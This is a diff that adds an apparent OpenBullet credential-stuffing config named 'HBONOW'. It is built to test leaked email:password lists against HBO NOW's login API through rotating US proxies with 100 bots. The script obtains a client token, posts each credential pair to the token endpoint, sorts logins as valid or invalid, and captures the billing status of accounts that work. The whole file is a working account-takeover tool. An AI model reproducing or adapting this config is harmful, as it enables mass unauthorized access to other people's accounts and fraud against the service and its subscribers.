@@ -1,0 +1,66 @@
+[SETTINGS]
+{
+  "Name": "HBONOW",
+  "SuggestedBots": 100,
+  "LastModified": "2018-06-23T01:33:00.3620798+00:00",
+  "AdditionalInfo": "ONLY US PROXIES",
+  "Author": "SubAtomic",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://comet.api.hbo.com/tokens" AutoRedirect=TRUE 
+  CONTENT "{\"client_id\":\"88a4f3c6-f1de-42d7-8ef9-d3b00139ea6a\",\"client_secret\":\"88a4f3c6-f1de-42d7-8ef9-d3b00139ea6a\",\"scope\":\"browse video_playback_free\",\"grant_type\":\"client_credentials\",\"deviceSerialNumber\":\"2243c27f-fa15-40db-b605-1c9275039757\",\"clientDeviceData\":{\"paymentProviderCode\":\"blackmarket\"}}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: application/vnd.hbo.v9.full+json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://play.hbonow.com/series/urn:hbo:series:GWukCJAq-nIuHwwEAAAB4" 
+  HEADER "Origin: https://play.hbonow.com" 
+  HEADER "X-Hbo-Client-Version: Hadron/15.1.0.7 desktop (DESKTOP)" 
+  HEADER "X-B3-TraceId: 4c8f9e4b-4960-4ead-8227-5b4b4422ae77-fec0cf37-b391-41ba-da3a-f83fd77ea30b" 
+PARSE "<SOURCE>" JSON "access_token" Recursive=FALSE -> VAR "TOKEN" "" "" 
+REQUEST POST "https://comet.api.hbo.com/tokens" AutoRedirect=TRUE 
+  CONTENT "{\"grant_type\":\"user_name_password\",\"scope\":\"browse video_playback device elevated_account_management\",\"username\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: application/vnd.hbo.v9.full+json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://play.hbonow.com/series/urn:hbo:series:GWukCJAq-nIuHwwEAAAB4" 
+  HEADER "Origin: https://play.hbonow.com" 
+  HEADER "Authorization: Bearer <TOKEN>" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "invalid_credentials" 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+#TOKEN2 PARSE "<SOURCE>" JSON "access_token" Recursive=FALSE -> VAR "TOKEN2" "" "" 
+REQUEST POST "https://comet.api.hbo.com/content" AutoRedirect=TRUE 
+  CONTENT "[{\"id\":\"urn:hbo:season:GWukCJAp_GsPDwgEAAAB6\",\"headers\":{\"If-None-Match\":\"\\"abf-SMu4nqo0hhlx4sY1xsZYGg\\"\"}},{\"id\":\"urn:hbo:billing-status:mine\"}]" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: application/vnd.hbo.v9.full+json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://play.hbonow.com/series/urn:hbo:series:GWukCJAq-nIuHwwEAAAB4" 
+  HEADER "Origin: https://play.hbonow.com" 
+  HEADER "X-Hbo-Client-Version: Hadron/15.1.0.7 desktop (DESKTOP)" 
+  HEADER "X-B3-TraceId: 4c8f9e4b-4960-4ead-8227-5b4b4422ae77-fec0cf37-b391-41ba-da3a-f83fd77ea30b" 
+  HEADER "Authorization: Bearer <TOKEN>" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "You’re not subscribed to HBO NOW" 
+PARSE "<SOURCE>" LR "\"billingInformationMessage\": \"" "\"" Recursive=FALSE -> CAP "INFO" "" "" 
